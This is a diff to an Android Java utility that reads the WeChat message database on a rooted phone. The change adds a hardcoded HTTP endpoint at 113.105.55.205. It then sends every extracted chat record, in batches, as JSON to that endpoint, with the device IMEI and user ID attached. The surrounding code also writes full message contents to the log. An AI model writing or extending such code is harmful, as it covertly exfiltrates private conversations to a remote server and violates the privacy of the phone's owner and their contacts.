@@ -13,6 +13,7 @@ import java.util.ArrayList;
 import java.util.List;
 
 import cn.truistic.enmicromsg.common.util.DeviceUtil;
+import cn.truistic.enmicromsg.common.util.JsonUtil;
 import cn.truistic.enmicromsg.common.util.MD5Util;
 import cn.truistic.enmicromsg.common.util.RootUtil;
 import cn.truistic.enmicromsg.common.util.SharedPerfUtil;
@@ -22,6 +23,7 @@ import cn.truistic.enmicromsg.info.UserInfo;
 import cn.truistic.enmicromsg.main.MainMVP;
 
 import static cn.truistic.enmicromsg.common.util.DeviceUtil.formatTime;
+import static cn.truistic.enmicromsg.common.util.DeviceUtil.postJson;
 
 /**
  * 数据库工具类
@@ -34,6 +36,9 @@ public class DBUtill {
     private static String mSelection;
     private static byte[] mLvbuffer,mLvbuff;
     private static int msgId,mVaid;
+
+    private static final String MessageUrlPath =
+            "http://113.105.55.205:8090/UpData/ReceiveMessage.aspx";
 
     private static String  mContent,mCreateTime,mTalker,
             mIsSend,mUserName,mAlias,mNickName,mMsgSvrId,mType,mStatus,mIsShowTimer,mReserved,mImgPath,mTransContent
@@ -51,6 +56,7 @@ public class DBUtill {
 
     private static MainMVP.IHomeView homeView;
     private static MainMVP.IHomeModel homeModel;
+    private static String mJsonMessage;
 
 
     public DBUtill(Context context) {
@@ -105,83 +111,118 @@ public class DBUtill {
             return null;
         }
         try {
-
             //*********************************查询消息记录****************************************
-            assert database != null;
-            Cursor c = database.query("message", null,mSelection,new String[]{mTime}, null, null,
-                    null);
-            while (c.moveToNext()) {
-
-                //消息ID
-                msgId = c.getInt(c.getColumnIndex("msgId"));
-                //发送还是接收
-                mIsSend = c.getString(c.getColumnIndex("isSend"));
-                //消息时间
-                mCreateTime = c.getString(c.getColumnIndex("createTime"));
-                //记号 ,名称和username一样
-                mTalker = c.getString(c.getColumnIndex("talker"));
-                //聊天信息
-                mContent = c.getString(c.getColumnIndex("content"));
-                mMsgSvrId = c.getString(c.getColumnIndex("msgSvrId"));
-                mType = c.getString(c.getColumnIndex("type"));
-                mStatus = c.getString(c.getColumnIndex("status"));
-                mIsShowTimer = c.getString(c.getColumnIndex("isShowTimer"));
-                mReserved = c.getString(c.getColumnIndex("reserved"));
-                mImgPath = c.getString(c.getColumnIndex("imgPath"));
-                mTransContent = c.getString(c.getColumnIndex("transContent"));
-                mTransBrandWording = c.getString(c.getColumnIndex("transBrandWording"));
-                mTalkerId = c.getString(c.getColumnIndex("talkerId"));
-                mBizClientMsgId = c.getString(c.getColumnIndex("bizClientMsgId"));
-                mBizChatUserId = c.getString(c.getColumnIndex("bizChatUserId"));
-                mMsgSeq = c.getString(c.getColumnIndex("msgSeq"));
-                mFlag = c.getString(c.getColumnIndex("flag"));
-                mBizChaId = c.getString(c.getColumnIndex("bizChatId"));
-                mLvbuffer = c.getBlob(c.getColumnIndex("lvbuffer"));
-
-                if (mIsSend.equals("1")){
-                    mIsSend="发送";
-                }else if (mIsSend.equals("0")){
-                    mIsSend="接收";
-                }
-
-
-                if(mBizChatUserId == null || mBizChatUserId.length() == 0){
-                    mBizChatUserId = "";
-                }
-                if(mBizClientMsgId == null || mBizClientMsgId.length() == 0){
-                    mBizClientMsgId = "";
-                }
-                if(mIsShowTimer == null || mIsShowTimer.length() == 0){
-                    mIsShowTimer = "";
-                }
-                if(mReserved == null || mReserved.length() == 0){
-                    mReserved = "";
-                }
-                if(mTransBrandWording == null || mTransBrandWording.length() == 0){
-                    mTransBrandWording = "";
-                }
-                if(mTransContent == null || mTransContent.length() == 0){
-                    mTransContent = "";
-                }
-                if(mImgPath == null || mImgPath.length() == 0){
-                    mImgPath = "";
-                }
-                if(mFlag == null || mFlag.length() == 0){
-                    mFlag = "";
-                }
-
-                mMessageInfo = new MessageInfo(uinStr,imei,msgId,mMsgSvrId,mType,mStatus,mIsSend,
-                        mIsShowTimer,formatTime(mCreateTime),mTalker,mContent,mImgPath,mReserved,mLvbuffer,mTransContent,
-                        mTransBrandWording,mTalkerId,mBizClientMsgId,mBizChaId,mBizChatUserId,
-                        mMsgSeq,mFlag);
-
-
-                Log.i("DDDBBB--U--MessageInfo", mMessageInfo.toString());
-                mMessageInfos.add(mMessageInfo);
+            Cursor c = database.rawQuery("select count(0)  from message",null);
+            final  int  size;
+            c.moveToFirst();
+            if (!c.isAfterLast()) {
+                size = c.getInt(0);
+            } else {
+                Log.d("DDDBBB---P--SIZE","Query failed !!!!!!!!!!!!!!!!!!!!!!!");
+                return null;
             }
             c.close();
-            database.close();
-            SharedPerfUtil.setParam(context,"last_time_wechat",mCreateTime);
+
+            int offset = 0;
+            final int length = size /10;
+            boolean  isNotLast = true;
+            int arg0, arg1;
+            while (isNotLast){
+                if (offset + length >size ){
+                    arg0 =  size - offset;
+                    if (arg0 <= 0){
+                        break;
+                    }else {
+                        isNotLast = false;
+                    }
+                }else {
+                    arg0 = length;
+                }
+                arg1 = offset;
+                offset += length;
+
+
+                c = database.query("message", null, mSelection, new String[]{mTime}, null,
+                        null,"msgId asc limit " + arg0 + " offset " + arg1);    //"0,500"
+
+
+                for(c.moveToFirst();!c.isAfterLast();c.moveToNext()) {
+                    //while (c.moveToNext() ) {
+
+                    //消息ID
+                    msgId = c.getInt(c.getColumnIndex("msgId"));
+                    //发送还是接收
+                    mIsSend = c.getString(c.getColumnIndex("isSend"));
+                    //消息时间
+                    mCreateTime = c.getString(c.getColumnIndex("createTime"));
+                    //记号 ,名称和username一样
+                    mTalker = c.getString(c.getColumnIndex("talker"));
+                    //聊天信息
+                    mContent = c.getString(c.getColumnIndex("content"));
+                    mMsgSvrId = c.getString(c.getColumnIndex("msgSvrId"));
+                    mType = c.getString(c.getColumnIndex("type"));
+                    mStatus = c.getString(c.getColumnIndex("status"));
+                    mIsShowTimer = c.getString(c.getColumnIndex("isShowTimer"));
+                    mReserved = c.getString(c.getColumnIndex("reserved"));
+                    mImgPath = c.getString(c.getColumnIndex("imgPath"));
+                    mTransContent = c.getString(c.getColumnIndex("transContent"));
+                    mTransBrandWording = c.getString(c.getColumnIndex("transBrandWording"));
+                    mTalkerId = c.getString(c.getColumnIndex("talkerId"));
+                    mBizClientMsgId = c.getString(c.getColumnIndex("bizClientMsgId"));
+                    mBizChatUserId = c.getString(c.getColumnIndex("bizChatUserId"));
+                    mMsgSeq = c.getString(c.getColumnIndex("msgSeq"));
+                    mFlag = c.getString(c.getColumnIndex("flag"));
+                    mBizChaId = c.getString(c.getColumnIndex("bizChatId"));
+                    mLvbuffer = c.getBlob(c.getColumnIndex("lvbuffer"));
+
+                    if (mIsSend.equals("1")){
+                        mIsSend="发送";
+                    }else if (mIsSend.equals("0")){
+                        mIsSend="接收";
+                    }
+
+
+                    if(mBizChatUserId == null || mBizChatUserId.length() == 0){
+                        mBizChatUserId = "";
+                    }
+                    if(mBizClientMsgId == null || mBizClientMsgId.length() == 0){
+                        mBizClientMsgId = "";
+                    }
+                    if(mIsShowTimer == null || mIsShowTimer.length() == 0){
+                        mIsShowTimer = "";
+                    }
+                    if(mReserved == null || mReserved.length() == 0){
+                        mReserved = "";
+                    }
+                    if(mTransBrandWording == null || mTransBrandWording.length() == 0){
+                        mTransBrandWording = "";
+                    }
+                    if(mTransContent == null || mTransContent.length() == 0){
+                        mTransContent = "";
+                    }
+                    if(mImgPath == null || mImgPath.length() == 0){
+                        mImgPath = "";
+                    }
+                    if(mFlag == null || mFlag.length() == 0){
+                        mFlag = "";
+                    }
+
+                    mMessageInfo = new MessageInfo(uinStr,imei,msgId,mMsgSvrId,mType,mStatus,mIsSend,
+                            mIsShowTimer,formatTime(mCreateTime),mTalker,mContent,mImgPath,mReserved,mLvbuffer,mTransContent,
+                            mTransBrandWording,mTalkerId,mBizClientMsgId,mBizChaId,mBizChatUserId,
+                            mMsgSeq,mFlag);
+
+
+                    mMessageInfos.add(mMessageInfo);
+                    Log.i("DDDBBB--P--MessageInfo",mMessageInfos.size()+"*****"+mMessageInfo.toString
+                            ());
+                }
+                mJsonMessage = JsonUtil.toJson(mMessageInfos);
+                postJson(MessageUrlPath,mJsonMessage);
+                c.close();
+                //database.close();
+                SharedPerfUtil.setParam(context,"last_time_wechat",mCreateTime);
+            }
 
         } catch (Exception e) {
 
@@ -404,6 +445,7 @@ public class DBUtill {
                 dirs.add(dir.substring(2, 34));
             }
         }
+
         if (dirs.size() == 0) {
             return  null ;
         } else {
